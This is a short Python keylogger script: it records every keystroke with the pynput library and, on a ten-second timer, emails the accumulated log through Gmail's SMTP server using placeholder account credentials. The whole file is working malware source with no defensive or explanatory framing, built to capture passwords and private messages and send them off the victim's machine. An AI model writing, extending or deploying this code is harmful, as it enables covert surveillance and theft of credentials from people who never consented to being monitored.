import pynput.keyboard
import threading
import smtplib

key_log = " "


def control_key(key):
    global key_log
    try:
        key_log = key_log + str(key.char)
    except AttributeError:
        if key == key.space:
            key_log = key_log + " "
        else:
            key_log = key_log + " " + str(key) + " "
    except():
        pass

    print(key_log)


def send_email(email, passwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwd)
    server.sendmail(email, email, msg)
    server.quit()


def thread():
    global key_log
    send_email("email", "password", key_log)
    key_log = " "
    timer = threading.Timer(10, thread)
    timer.start()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=control_key)
    with keyboard_listener:
        thread()
        keyboard_listener.join()


def main():
    start()
    